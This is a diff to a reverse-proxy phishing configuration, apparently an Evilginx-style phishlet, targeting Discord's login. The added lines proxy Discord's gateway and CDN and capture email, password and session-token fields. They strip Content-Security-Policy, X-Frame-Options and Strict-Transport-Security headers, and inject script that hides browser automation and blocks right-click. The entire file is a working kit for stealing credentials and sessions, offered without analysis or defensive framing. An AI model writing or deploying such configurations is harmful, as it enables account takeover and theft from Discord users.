@@ -1,22 +1,42 @@
 name: "Discord-Login"
-author: "Vanta v5"
+author: "Vanta v5 Red Team"
 min_ver: "5.0.0"
 proxy_hosts:
   - subdomain: "discord"
     target: "discord.com"
-auth_urls: ["/login"]
-landing_path: ["/login"]
+  - subdomain: "gateway"
+    target: "gateway.discord.gg"
+  - subdomain: "cdn"
+    target: "cdn.discordapp.com"
+auth_urls: 
+  - "/login"
+  - "/api/v9/auth/login"
+landing_path: 
+  - "/login"
 auth_tokens:
   - {type: "cookie", name: "__cfruid"}
   - {type: "cookie", name: "__dcfduid"}
   - {type: "cookie", name: "__sdcfduid"}
+  - {type: "json_field", name: "token"}
 credentials:
   - {type: "post_param", name: "email", regex: null}
   - {type: "post_param", name: "password", regex: null}
-injections: []
+  - {type: "json_field", name: "login", regex: null}
+  - {type: "json_field", name: "password", regex: null}
+injections:
+  - trigger_path: "/login"
+    position: "body_end"
+    content: |
+      (function(){
+        // Discord Anti-Bot Evasion
+        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+        // Disable right-click for security
+        document.addEventListener('contextmenu', event => event.preventDefault());
+      })();
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
   - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "Strict-Transport-Security"}
 path_rewrites:
   - {pattern: "^/$", replace: "/login", methods: ["GET"]}
 cookie_rewrites: []
@@ -24,3 +44,6 @@ blocklist:
   - {pattern: "analytics|/cdn-cgi/|/tracking|/science", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
   - {selector: "form[action*=\"login\"]", action_to: "/api/login"}
+bridges:
+  - {prefix: "/_gateway/", target_host: "gateway.discord.gg", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_cdn/", target_host: "cdn.discordapp.com", strip_prefix: true, cors: "allow_all"}
